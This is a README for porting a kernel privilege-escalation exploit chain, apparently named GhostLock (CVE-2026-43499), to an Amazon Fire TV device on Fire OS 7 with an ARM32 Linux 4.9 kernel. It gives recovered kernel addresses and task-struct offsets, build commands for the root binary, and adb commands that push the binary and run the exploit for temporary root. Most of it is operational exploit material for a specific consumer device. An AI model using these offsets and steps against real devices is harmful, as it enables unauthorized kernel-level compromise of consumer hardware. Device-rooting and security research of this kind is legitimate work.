# GhostLock port for Amazon Almond (PS7715)

This directory contains the Almond-specific adaptation work for the ARM32
CVE-2026-43499/GhostLock chain.

## Target

- Product device: `almond`
- Hardware variant: `almond-bt`
- Fire OS: `PS7715.5585N`
- Incremental: `0035736899972`
- Android: 9 / API 28
- Kernel: Linux 4.9.113, ARMv7
- Kernel image base: `0xc0108000`

The uploaded OTA was verified by MD5 as:

`44451b108c3778e4b6c9d3a1dedcb450`

Its SHA-256 is:

`f8e88ef3012dca2c0e5f1ff68198d1ebcf97d8b51a307d15e3c561c219102dd9`

## Port strategy

The public R0rt1z2 GhostLock 5.10 tree is aimed at newer Fire OS 8 / Linux
5.10 targets. Almond is Fire OS 7 on 32-bit ARM/Linux 4.9, so the closer
reference is the ARM32 Hazel CVE-2026-43499 port by dorlow.

That implementation already loads exploit addresses and task offsets from a
strict profile and does not hard-code the product name in the profile parser.
For Almond, the adaptation therefore consists of a new independently derived
profile plus static validation of every kernel anchor used by the exploit
chain.

No upstream exploit source is vendored here. Use `prepare_upstream.sh` to
check out the pinned reference tree and install the Almond profile into it.

## Current status

The following Almond values were recovered from the PS7715 kernel and checked
statically:

| Item | Almond value | Evidence |
| --- | --- | --- |
| `init_task` | `0xc120d540` | `swapper` comm, self-referential task list, init cred pointers |
| `task.tasks` | `0x258` | validated against `init_task` |
| `task.real_cred` | `0x3ec` | validated |
| `task.cred` | `0x3f0` | validated |
| `task.comm` | `0x3f4` | validated |
| `ashmem_release` | `0xc07757b4` | function semantics + fops link |
| `ashmem_open` | `0xc0775918` | function semantics + fops link |
| `ashmem_mmap` | `0xc07759a4` | function semantics + fops link |
| `ashmem_ioctl` | `0xc0775f88` | ioctl dispatch + fops link |
| `ashmem_fops` | `0xc0d464c8` | unique file_operations slot layout |
| `ashmem_misc_fops` | `0xc1257df4` | unique miscdevice fops pointer; nearby name is `ashmem` |
| `configfs_write_file` | `0xc040f4e0` | matched Linux 4.9 configfs write semantics |
| `configfs_read_file` | `0xc040f67c` | matched Linux 4.9 configfs read semantics |

The current `pi_task` candidate is `0xc120d30c`. It is derived from the
stable Hazel PS7715 static-data relationship to `init_task`, but unlike the
other anchors it still needs device-side validation. For that reason the
profile is deliberately marked `static-manual`, not hardware-tested.

## Static verification

After extracting/decompressing the kernel to `vmlinux.raw`:

```sh
python3 tools/verify_almond_ghostlock.py \
  /path/to/vmlinux.raw \
  ghostlock-almond/profiles/almond-PS7715.5585N-5585.conf
```

Expected result is `PASS` and the critical-anchor digest:

`dcdf81697e8b4931d16e02b8fee654e4ba69d712e242e327cba3ce1208ca431b`

## Prepare the reference exploit tree

```sh
./ghostlock-almond/prepare_upstream.sh
```

This checks out the pinned Hazel ARM32 reference commit under
`build/hazel-cve-2026-43499` and copies the Almond profile into its
`profiles/` directory.

Build using Android NDK r27d:

```sh
export NDK=/path/to/android-ndk-r27d
cd build/hazel-cve-2026-43499

"$NDK/toolchains/llvm/prebuilt/linux-x86_64/bin/clang" \
  --target=armv7a-linux-androideabi28 \
  -O2 -g0 -Wall -Wextra -Wpedantic -fPIE -pie \
  hazel_root.c hazel_profile.c -o almond_root -pthread
```

## Device-side profile check first

Push the binary and Almond profile, then run the non-exploit profile check:

```sh
adb shell mkdir -p /data/local/tmp/ghostlock-almond
adb push build/hazel-cve-2026-43499/almond_root /data/local/tmp/ghostlock-almond/
adb push ghostlock-almond/profiles/almond-PS7715.5585N-5585.conf \
  /data/local/tmp/ghostlock-almond/
adb shell chmod 755 /data/local/tmp/ghostlock-almond/almond_root

adb shell '/data/local/tmp/ghostlock-almond/almond_root \
  --profile /data/local/tmp/ghostlock-almond/almond-PS7715.5585N-5585.conf \
  --check-profile'
```

Do not proceed unless the runtime fingerprint, incremental, kernel release,
architecture, and product all match exactly.

## Running the port

After a clean `--check-profile`, the exploit invocation is the same command
without `--check-profile`:

```sh
adb shell '/data/local/tmp/ghostlock-almond/almond_root \
  --profile /data/local/tmp/ghostlock-almond/almond-PS7715.5585N-5585.conf'
```

This is still a first hardware test. The reclaim stage can panic/reboot the TV.
Root is temporary and is lost on reboot. SELinux remains enforcing in the
reference implementation.

If the first device run fails, capture the complete stdout/stderr log before
changing offsets or timing. The `pi_task` candidate and reclaim timing are the
first two items to validate rather than blindly moving other addresses.
